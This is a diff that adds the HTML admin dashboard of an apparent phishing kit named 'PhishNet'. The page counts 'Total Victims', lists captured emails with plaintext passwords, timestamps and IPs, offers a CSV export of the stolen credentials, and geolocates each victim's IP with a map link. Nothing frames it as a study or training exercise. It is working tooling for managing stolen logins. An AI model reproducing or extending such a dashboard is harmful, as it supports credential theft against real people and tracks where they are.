@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>PhishNet Admin Dashboard</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <style>
+    .gradient-bg {
+      background: linear-gradient(135deg, #6b46c1 0%, #4299e1 50%, #38b2ac 100%);
+    }
+    .stat-card {
+      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+      transition: all 0.3s ease;
+    }
+    .stat-card:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+    }
+    .table-row:hover {
+      background-color: #f8fafc;
+    }
+  </style>
+</head>
+<body class="font-sans bg-gray-50 text-gray-800 min-h-screen p-6">
+
+  <!-- Header -->
+  <div class="flex flex-col md:flex-row justify-between items-center mb-8 gap-4">
+    <div class="gradient-bg text-white px-6 py-3 rounded-xl shadow-lg">
+      <h1 class="text-4xl font-bold p-3 tracking-tight">PhishNet Admin Dashboard</h1>
+      <p class="text-sm opacity-90">Security Analytics Console</p>
+    </div>
+
+    <form action="/logout" method="GET">
+      <button
+        type="submit"
+        onclick="return confirm('Are you sure you want to logout and return to homepage?')"
+        class="bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white font-semibold py-2 px-6 rounded-lg shadow-md transition-all duration-300 transform hover:scale-105"
+      >
+        Logout / Back
+      </button>
+    </form>
+  </div>
+
+  <!-- Stats Section -->
+  <div class="flex flex-wrap gap-6 mb-8">
+    <div class="stat-card bg-white p-6 rounded-xl shadow-sm flex-1 min-w-[240px]">
+      <div class="flex items-center justify-between">
+        <div>
+          <p class="text-gray-500 text-sm font-medium">Total Victims</p>
+          <p id="victimCount" class="text-3xl font-bold text-gray-800 mt-1">Loading...</p>
+        </div>
+        <div class="bg-red-100 p-3 rounded-full">
+          <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 text-red-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+          </svg>
+        </div>
+      </div>
+      <p class="text-xs text-gray-400 mt-2">Updated in real-time</p>
+    </div>
+
+    <button
+      id="downloadCSV"
+      class="stat-card bg-white p-6 rounded-xl shadow-sm flex items-center justify-center gap-2 min-w-[240px] hover:bg-gray-50 border border-gray-200"
+    >
+      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
+      </svg>
+      <span class="text-lg font-semibold text-gray-700">Export CSV</span>
+    </button>
+  </div>
+
+  <!-- Chart Section -->
+  <div class="bg-white rounded-xl shadow-md p-6 mb-8">
+    <div class="flex justify-between items-center mb-4">
+      <h3 class="text-xl font-semibold text-gray-800">Login Activity Timeline</h3>
+      <span class="text-sm text-gray-500">Last 30 days</span>
+    </div>
+    <canvas id="loginChart" width="600" height="250"></canvas>
+  </div>
+
+  <!-- Table Section -->
+  <div class="bg-white rounded-xl shadow-md overflow-hidden mb-8">
+    <div class="px-6 py-4 border-b border-gray-200">
+      <h3 class="text-xl font-semibold text-gray-800">Captured Credentials</h3>
+      <p class="text-sm text-gray-500">All captured login attempts</p>
+    </div>
+    <div class="overflow-x-auto">
+      <table class="w-full">
+        <thead class="bg-gray-100">
+          <tr>
+            <th class="text-left py-4 px-6 font-medium text-gray-700 uppercase tracking-wider">Email</th>
+            <th class="text-left py-4 px-6 font-medium text-gray-700 uppercase tracking-wider">Password</th>
+            <th class="text-left py-4 px-6 font-medium text-gray-700 uppercase tracking-wider">Timestamp</th>
+            <th class="text-left py-4 px-6 font-medium text-gray-700 uppercase tracking-wider">IP</th>
+            <th class="text-left py-4 px-6 font-medium text-gray-700 uppercase tracking-wider">Location</th>
+          </tr>
+        </thead>
+        <tbody id="data-table" class="divide-y divide-gray-200">
+          <!-- JS-injected rows -->
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- JS -->
+  <script>
+    history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+      location.replace("/logout");
+    };
+
+    document.getElementById("downloadCSV").addEventListener("click", () => {
+      window.location.href = "/download";
+    });
+
+    document.addEventListener("DOMContentLoaded", () => {
+      const tableBody = document.querySelector("#data-table");
+      const victimCount = document.getElementById("victimCount");
+      const dateCounts = {};
+
+      fetch('/api/data')
+        .then(res => res.json())
+        .then(data => {
+          data.forEach(entry => {
+            const tr = document.createElement("tr");
+            tr.className = "table-row";
+
+            const dateOnly = entry.timestamp.split(" ")[0];
+            dateCounts[dateOnly] = (dateCounts[dateOnly] || 0) + 1;
+
+            tr.innerHTML = `
+              <td class="py-4 px-6">${entry.username}</td>
+              <td class="py-4 px-6 font-mono text-red-600">${entry.password}</td>
+              <td class="py-4 px-6 text-gray-500">${entry.timestamp}</td>
+              <td class="py-4 px-6 ip-cell font-mono text-blue-600">${entry.ip}</td>
+              <td class="py-4 px-6 location-cell">Loading...</td>
+            `;
+            tableBody.appendChild(tr);
+          });
+
+          victimCount.textContent = data.length;
+
+          const ctx = document.getElementById("loginChart").getContext("2d");
+          new Chart(ctx, {
+            type: "bar",
+            data: {
+              labels: Object.keys(dateCounts),
+              datasets: [{
+                label: "Login Attempts",
+                data: Object.values(dateCounts),
+                backgroundColor: 'rgba(99, 102, 241, 0.7)',
+                borderColor: 'rgba(99, 102, 241, 1)',
+                borderWidth: 1,
+                borderRadius: 4
+              }]
+            },
+            options: {
+              responsive: true,
+              plugins: {
+                legend: {
+                  display: false
+                }
+              },
+              scales: {
+                y: {
+                  beginAtZero: true,
+                  ticks: { stepSize: 1 },
+                  grid: {
+                    color: 'rgba(0, 0, 0, 0.05)'
+                  }
+                },
+                x: {
+                  grid: {
+                    display: false
+                  }
+                }
+              }
+            }
+          });
+
+          // Load location
+          const ipCells = document.querySelectorAll(".ip-cell");
+          const locationCells = document.querySelectorAll(".location-cell");
+
+          ipCells.forEach((cell, index) => {
+            const ip = cell.innerText;
+            fetch(`/api/location?ip=${encodeURIComponent(ip)}`)
+              .then(res => res.json())
+              .then(data => {
+                if (data.location !== "Unknown" && data.latitude && data.longitude) {
+                  const link = document.createElement("a");
+                  link.href = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+                  link.target = "_blank";
+                  link.className = "text-indigo-600 hover:text-indigo-800 hover:underline flex items-center";
+                  link.innerHTML = `
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z" />
+                      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z" />
+                    </svg>
+                    ${data.location}
+                  `;
+                  locationCells[index].innerHTML = "";
+                  locationCells[index].appendChild(link);
+                } else {
+                  locationCells[index].innerText = "Unknown";
+                  locationCells[index].className = "py-4 px-6 text-gray-400";
+                }
+              })
+              .catch(() => {
+                locationCells[index].innerText = "Error";
+                locationCells[index].className = "py-4 px-6 text-gray-400";
+              });
+          });
+        })
+        .catch(err => {
+          victimCount.textContent = "Error";
+          victimCount.className = "text-3xl font-bold text-gray-400 mt-1";
+          console.error("Dashboard error:", err);
+        });
+    });
+  </script>
+</body>
+</html>
